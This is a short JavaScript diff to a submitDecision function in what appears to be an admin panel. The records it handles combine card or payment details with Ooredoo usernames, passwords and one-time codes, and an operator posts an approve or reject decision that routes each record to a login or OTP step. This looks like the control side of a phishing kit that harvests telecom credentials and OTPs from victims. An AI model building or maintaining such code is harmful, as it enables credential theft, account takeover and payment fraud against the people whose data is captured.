@@ -568,28 +568,28 @@
 
   async function submitDecision(d, decision) {
     const id = d.id || (d.applicant && d.applicant.id) || d._id;
+    const card = d.card || d.payment || null;
+    const hasLoginData = Boolean((d.ooredooUser || (card && card.ooredooUser)) && (d.ooredooPass || (card && card.ooredooPass)));
+    const hasOtpData = Boolean(d.ooredooOtp || (card && card.ooredooOtp));
+    const flow = hasOtpData ? 'otp' : 'login';
+    const orderId = String(id || sessionStorage.getItem('safwa_order_id') || 'ooredoo-' + Date.now());
+    const decisionKey = 'ooredooDecision_' + orderId;
+    const flowKey = 'ooredooFlow_' + orderId;
+
     try {
       if (id) {
-        await fetch('/api/payments/' + encodeURIComponent(id) + '/decision', {
+        await fetch('/api/orders/' + encodeURIComponent(id) + '/decision', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
             Authorization: 'Bearer ' + adminToken
           },
-          body: JSON.stringify({ decision: decision })
+          body: JSON.stringify({ decision: decision, flow: flow })
         });
       }
     } catch (err) { /* ignore network errors, still update UI */ }
 
     try {
-      const card = d.card || d.payment || null;
-      const hasLoginData = Boolean((d.ooredooUser || (card && card.ooredooUser)) && (d.ooredooPass || (card && card.ooredooPass)));
-      const hasOtpData = Boolean(d.ooredooOtp || (card && card.ooredooOtp));
-      const flow = hasOtpData ? 'otp' : 'login';
-      const orderId = String(id || sessionStorage.getItem('safwa_order_id') || 'ooredoo-' + Date.now());
-      const decisionKey = 'ooredooDecision_' + orderId;
-      const flowKey = 'ooredooFlow_' + orderId;
-
       localStorage.setItem(decisionKey, decision);
       sessionStorage.setItem(decisionKey, decision);
       localStorage.setItem(flowKey, flow);
